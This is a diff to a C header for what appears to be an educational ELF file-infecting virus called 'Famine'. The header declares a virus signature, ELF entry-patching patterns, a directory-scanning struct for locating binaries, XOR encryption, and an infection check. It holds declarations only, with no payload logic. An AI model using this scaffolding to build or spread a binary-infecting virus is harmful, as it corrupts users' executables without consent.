@@ -10,29 +10,19 @@
 # include <sys/stat.h>
 # include <errno.h>
 # include <sys/syscall.h>
-
 # include <fcntl.h>
 # include <stdio.h>
 # include <stdlib.h>
 # include <unistd.h>
 # include <string.h>
-
-# define BYTECODE	"" // to remove
+# include <dirent.h>
 
 # define KEY_SIZE 64
 
-# define VIRUS_NAME "famine"
+# define SIGNATURE ((char []){'F','a','m','i','n','e',' ','v','e','r','s','i','o','n',' ','1','.','0',' ','(','c',')','o','d','e','d',' ','b','y',' ','v','s','t','e','f','f','e','n','\n','\0'})
 
-# define NEW_BIN_FILENAME "woody"
-
-# undef		ELFMAG
-# define 	ELFMAG	(char []){0x7f, 'E','L','F'}
-
-void	_start();
-void	woody_mod();
-long	syscall_wrapper(long number, ...);
-
-# define BYTECODE_SIZE ((size_t)syscall_wrapper - (size_t)woody_mod + 1)
+# undef	 ELFMAG
+# define ELFMAG	(char []){0x7f, 'E','L','F'}
 
 # define PATTERN_ENTRY_OLD		0xAAAAAAe9
 # define PATTERN_ENTRY_OLD_SIZE_OPCODE	1
@@ -47,6 +37,19 @@ long	syscall_wrapper(long number, ...);
 # define PATTERN_ENTRY_TEXT_SIZE_OPCODE	0
 
 typedef enum {false, true} bool;
+
+struct linux_dirent64 {
+	__ino64_t	d_ino;		/* 64-bit inode number */
+	__off64_t	d_off;		/* 64-bit offset to next structure */
+	unsigned short	d_reclen;	/* Size of this dirent */
+	unsigned char	d_type;		/* File type */
+	char		d_name[];	/* Filename (null-terminated) */
+};
+
+struct	s_buff_find_binaries {
+	char	file_path[PATH_MAX];
+	char	getdents64[1024];
+}	t_buff_find_binaries;
 
 typedef struct	s_key {
 	char	raw[KEY_SIZE];
@@ -70,6 +73,8 @@ typedef struct	s_woody {
 typedef struct	s_famine {
 	t_woody		woody;
 }		t_famine;
+
+void	woody_mod_c(char *target);
 
 void	exit_clean(struct s_woody *woody, int exit_status);
 
@@ -109,7 +114,16 @@ void	debug_print_program_header(struct s_woody *woody);
 void	debug_print_section_header(struct s_woody *woody);
 
 // asm func
+void	_start();
+void	woody_mod();
 void	xor_cipher(char *key, size_t key_size, void *text, size_t text_size);
 long	syscall_wrapper(long number, ...);
+
+// famine func
+bool	check_binary_infected(struct s_woody *woody, Elf64_Shdr *shdr_last);
+
+
+# define BYTECODE_UNPACKER_SIZE ((size_t)syscall_wrapper - (size_t)woody_mod + 1)
+# define BYTECODE_SIZE ((size_t)syscall_wrapper - (size_t)woody_mod + 1)
 
 #endif
